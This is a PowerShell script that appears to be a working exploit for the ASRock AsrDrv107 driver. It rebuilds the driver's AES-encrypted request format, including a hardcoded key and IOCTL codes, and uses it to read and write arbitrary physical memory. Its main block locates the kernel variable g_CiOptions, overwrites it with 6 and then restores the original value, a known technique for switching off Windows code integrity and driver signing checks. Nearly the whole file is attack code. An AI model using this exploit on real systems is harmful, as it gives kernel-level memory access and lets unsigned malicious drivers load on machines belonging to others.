function Invoke-AsrDriverCall {
    param (
        [Parameter(Mandatory = $false, ParameterSetName = 'Read')]
        [Parameter(Mandatory = $false, ParameterSetName = 'Write')]
        [IntPtr]$VA = [IntPtr]::Zero,

        [Parameter(Mandatory = $false, ParameterSetName = 'Read')]
        [Parameter(Mandatory = $false, ParameterSetName = 'Write')]
        [Int64]$PA = 0L,

        [Parameter(Mandatory = $true, ParameterSetName = 'Read')]
        [Int32]$Length,

        [Parameter(Mandatory = $true, ParameterSetName = 'Write')]
        [byte[]]$Data
    )

    $PackDriverPackage = {
        [CmdletBinding()]
        param ([Parameter(Mandatory = $true)][uint32]$SubCommand, [byte[]]$RawData)

        # Prepare Inner Payload
        $InnerPayload = [byte[]]::new(8 + $RawData.Length)
        [BitConverter]::GetBytes($SubCommand).CopyTo($InnerPayload, 0)
        [Array]::Copy($RawData, 0, $InnerPayload, 8, $RawData.Length)

        # Compute buffer sizes
        $CiphertextLength = [int32]([Math]::Ceiling(($InnerPayload.Length + 1) / 16) * 16)
        $HeaderSize, $TrailerSize = 43, 6
        $OuterBuffer = [byte[]]::new($HeaderSize + $CiphertextLength + $TrailerSize)

        # Generate random material and populate metadata
        $Rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
        $IV = [byte[]]::new(16); $Rng.GetBytes($IV)
        $Entropy = [byte[]]::new(21); $Rng.GetBytes($Entropy)

        [BitConverter]::GetBytes(16).CopyTo($OuterBuffer, 2)
        [Array]::Copy($IV, 0, $OuterBuffer, 6, 16)
        [Array]::Copy($Entropy, 0, $OuterBuffer, 22, 21)

        # Key derivation & Mutation
        $KeyBytes = [System.Text.Encoding]::ASCII.GetBytes("C110DD4FE9434147B92A5A1E3FDBF29A")
        [Array]::Copy($OuterBuffer, 27, $KeyBytes, 13, 16)

        # Encrypt
        $Aes = [System.Security.Cryptography.Aes]::Create()
        $Aes.KeySize, $Aes.Mode, $Aes.Padding = 256, 'CBC', 'PKCS7'
        $Aes.Key, $Aes.IV = $KeyBytes, $IV
        try {
            $EncryptedData = $Aes.CreateEncryptor().TransformFinalBlock($InnerPayload, 0, $InnerPayload.Length)
        } finally {
            $Aes.Dispose()
        }

        # Assemble final buffer
        [Array]::Copy($EncryptedData, 0, $OuterBuffer, $HeaderSize, $EncryptedData.Length)
        [BitConverter]::GetBytes($EncryptedData.Length).CopyTo($OuterBuffer, ($OuterBuffer.Length - $TrailerSize))

        return $OuterBuffer
    }

    try {
        $hDevice = Get-FileHandle -FileName AsrDrv107
    } catch {}

    if ($null -eq $hDevice -or $hDevice -eq 0) {
        throw "The provided device interface handle (hDevice) is invalid or uninitialized."
    }

    if ($PA -eq 0L) {
        $PA = Convert-VirtualToPhysical -VirtualAddress $VA
        if ($PA -eq $null -or $PA -eq 0L) {
            throw "Error Convert PA from VA"
        }
    }

    # Define SubCommands cleanly
    $IOCTL_READ  = 2287624
    $IOCTL_WRITE = 2287628
    $IsRead  = $PSCmdlet.ParameterSetName -eq 'Read'
    $IsWrite = $PSCmdlet.ParameterSetName -eq 'Write'

    try {
        if ($IsRead) {
            $SubCommand     = $IOCTL_READ
            $TargetLength   = ($Length + 3) -band (-bnot 3)
            $WidthFlag      = 2
    
            # Allocate and zero out unmanaged buffer
            $LocalBufferPtr = New-IntPtr -Size $TargetLength
            $ZeroArray      = New-Object byte[] $TargetLength
            [Marshal]::Copy($ZeroArray, 0, $LocalBufferPtr, $TargetLength)

        } elseif ($IsWrite) {
            $SubCommand     = $IOCTL_WRITE
            $TargetLength   = $Data.Length
            $WidthFlag      = if ($TargetLength % 4 -eq 0) { 2 } elseif ($TargetLength % 2 -eq 0) { 1 } else { 0 }
            $LocalBufferPtr = New-IntPtr -Data $Data
        }

        # Construct the shared 32-byte Request Structure
        $RequestStruct = New-Object byte[] 32
        [BitConverter]::GetBytes([UInt64]$PA).CopyTo($RequestStruct, 0)
        [BitConverter]::GetBytes([UInt32]$TargetLength).CopyTo($RequestStruct, 8)
        [BitConverter]::GetBytes([UInt32]$WidthFlag).CopyTo($RequestStruct, 12)
        [BitConverter]::GetBytes([UInt64]$LocalBufferPtr.ToInt64()).CopyTo($RequestStruct, 16)
    
        # Invoke packaging logic once
        $OuterBuffer = &$PackDriverPackage -SubCommand $SubCommand -RawData $RequestStruct

        $OutputSizeHint  = 1024
        $OutputBuffer    = New-Object byte[] $OutputSizeHint

        $Outbytes        = New-IntPtr -Size 4
        $OuterBufferPtr  = New-IntPtr -Data $OuterBuffer
        $OutputBufferPtr = New-IntPtr -Data $OutputBuffer
        $Result = [Bool]($NtApi::DeviceIoControl(
                $hDevice, 2288640, 
                $OuterBufferPtr, $OuterBuffer.Length, 
                $OutputBufferPtr, $OutputBuffer.Length, 
                $Outbytes, [IntPtr]::Zero
            )
        )

        if ($IsWrite) {
            return $Result
        }

        if (-not $Result) {
            throw "Read Call failed"
        }

        $OutputBuffer = New-Object byte[] $Length
        [Marshal]::Copy($LocalBufferPtr, $OutputBuffer, 0, $Length)
        return $OutputBuffer
    }
    finally {
        Free-IntPtr $Outbytes
        Free-IntPtr $OuterBufferPtr
        Free-IntPtr $OutputBufferPtr
        Free-IntPtr $LocalBufferPtr
        Free-IntPtr $hDevice -Method NtHandle
    }
}

Clear-Host
Write-Host

try {
    $VA   = Get-gCiOptionsAddress
    $PA   = Convert-VirtualToPhysical $VA
    $Data = Invoke-AsrDriverCall -PA $PA -Length 4

    if ($Data) {
        Write-Host "Retrieve Original value:" -ForegroundColor Magenta
        $value = [System.BitConverter]::ToInt32([byte[]]$Data, 0)
        Write-Host ("Value: {0}" -f $value) -ForegroundColor Green
        Write-Host
    } else {
        Write-Warning "Driver call completed, but returned no data."
    }
    
    Write-Host "Write New value:" -ForegroundColor Magenta
    $Payload = [System.BitConverter]::GetBytes([Int16]6)
    Invoke-AsrDriverCall -PA $PA -Data $Payload | Out-Null
    $Data = Invoke-AsrDriverCall -PA $PA -Length 4
    if ($Data) {
        $Data | Format-HexView -Mode 8x
        Write-Host ("Value: {0}" -f ([System.BitConverter]::ToInt32($Data, 0))) -ForegroundColor Green
        Write-Host
    } else {
        Write-Warning "Driver call completed, but returned no data."
    }

    Write-Host "Write Origional value:" -ForegroundColor Magenta
    $Payload = [System.BitConverter]::GetBytes([Int32]$value)
    Invoke-AsrDriverCall -PA $PA -Data $Payload | Out-Null
    $Data = Invoke-AsrDriverCall -PA $PA -Length 4

    if ($Data) {
        $Data | Format-HexView -Mode 8x
        Write-Host ("Value: {0}" -f ([System.BitConverter]::ToInt32($Data, 0))) -ForegroundColor Green
        Write-Host
    } else {
        Write-Warning "Driver call completed, but returned no data."
    }
} 
catch {
    Write-Error "An error occurred during execution: $_"
}